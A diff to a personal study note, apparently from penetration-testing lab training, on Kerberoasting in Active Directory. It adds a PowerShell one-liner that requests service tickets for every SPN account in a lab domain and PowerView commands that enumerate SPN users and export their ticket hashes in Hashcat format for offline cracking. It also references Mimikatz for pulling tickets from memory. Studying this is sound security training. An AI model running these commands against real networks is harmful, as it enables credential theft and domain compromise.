@@ -61,4 +61,32 @@ The general concept here is:
 2. The `-AssemblyName` allows us to specify the assembly with the types we need
 3. [System.IdentityModel](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel?view=netframework-4.8) is the namespace that contains the classes relating to building security token services
 4. `New-Object` creates a new `.NET` object
-5. Using the [System.IdentityModel.Tokens](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens?view=netframework-4.8) namespace with the [KerberosRequestorSecurityToken](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens.kerberosrequestorsecuritytoken?view=netframework-4.8) class creates a security token for the passed SPN name
+5. Using the [System.IdentityModel.Tokens](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens?view=netframework-4.8) namespace with the [KerberosRequestorSecurityToken](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens.kerberosrequestorsecuritytoken?view=netframework-4.8) class creates a security token for the passed SPN name for our currently logged in user
+> This is essentially what automated tools such as [[Rubeus]] do
+
+#### Targeting all users
+> This will include computers, not just users
+
+```PowerShell
+setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
+```
+
+#### Extracting the tickets from memory using [[Mimikatz]]
+![[Mimikatz#Extracting Kerberos TGS Tickets]]
+
+### Automated Kerberoasting with PowerView - Windows
+#### View users with SPNs
+```PowerShell
+Import-Module .\PowerView.ps1
+Get-DomainUser * -spn | select samaccountname
+```
+#### Target a specific user
+```PowerShell
+Get-DomainUser -Identity [user] | Get-DomainSPNTicket -Format Hashcat
+```
+#### Extracting all tickets to a csv
+```PowerShell
+Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv [outputfile].csv -NoTypeInformation
+cat [outputfile].csv
+```
+
